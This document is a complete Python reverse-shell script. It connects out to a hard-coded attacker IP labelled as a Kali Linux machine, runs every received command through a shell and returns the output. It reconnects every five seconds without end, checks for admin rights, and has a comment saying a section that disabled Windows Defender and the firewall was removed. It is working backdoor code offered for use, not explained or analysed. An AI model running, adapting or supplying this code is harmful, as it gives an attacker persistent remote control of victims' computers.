import socket
import subprocess
import os
import time

def check_admin():
    """Check if script is running with admin privileges."""
    try:
        return os.getuid() == 0  # For Unix-like systems
    except AttributeError:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def reverse_shell(host, port):
    """Establish a reverse shell to the specified host and port."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print(f"[+] Connected to {host}:{port}")

        while True:
            data = s.recv(1024).decode().strip()
            if not data:
                break
            if data.lower() in ["exit", "quit"]:
                break

            try:
                result = subprocess.run(
                    data, shell=True, capture_output=True, text=True
                )
                output = result.stdout + result.stderr
            except Exception as e:
                output = f"Error: {str(e)}"

            s.send((output + "\n").encode())

    except socket.error as e:
        print(f"[-] Socket error: {e}")
        time.sleep(5)
    except Exception as e:
        print(f"[-] General error: {e}")
    finally:
        s.close()

def main():
    KALI_IP = "10.122.70.209"  # Replace with your Kali Linux IP
    PORT = 9999

    print("[*] Starting reverse shell...")
    
    # Removed Windows Defender/Firewall disabling section
    
    while True:
        try:
            reverse_shell(KALI_IP, PORT)
        except Exception as e:
            print(f"[-] Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    main()